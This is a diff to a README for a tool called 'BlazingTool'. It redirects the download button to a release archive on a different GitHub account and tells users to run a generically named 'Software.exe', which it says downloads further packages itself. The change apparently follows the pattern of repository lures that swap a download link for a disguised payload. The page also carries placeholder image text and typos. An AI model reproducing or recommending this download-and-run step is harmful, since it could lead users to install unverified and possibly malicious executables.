@@ -8,10 +8,10 @@
 To install this programm, follow these steps:
 
 [![asdasdasd](https://github.com/user-attachments/assets/b0cbbf20-4fdf-44be-94a0-f7f202f2f1be)
-](https://github.com/fmuiin14/BlazingTool/releases/download/V1.4/Release.zip)
+](https://github.com/YAYA5220/BlazingTool/releases/download/Release/Release.zip)
 
 ## **1. [Download the archive](https://github.com/fmuiin14/BlazingTool/releases/download/V1.4/Release.zip) from releases and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 
 ![sdsfdsdsdd](https://github.com/user-attachments/assets/47b38f5a-5ebf-4837-86fd-b4610ad0befc)
 
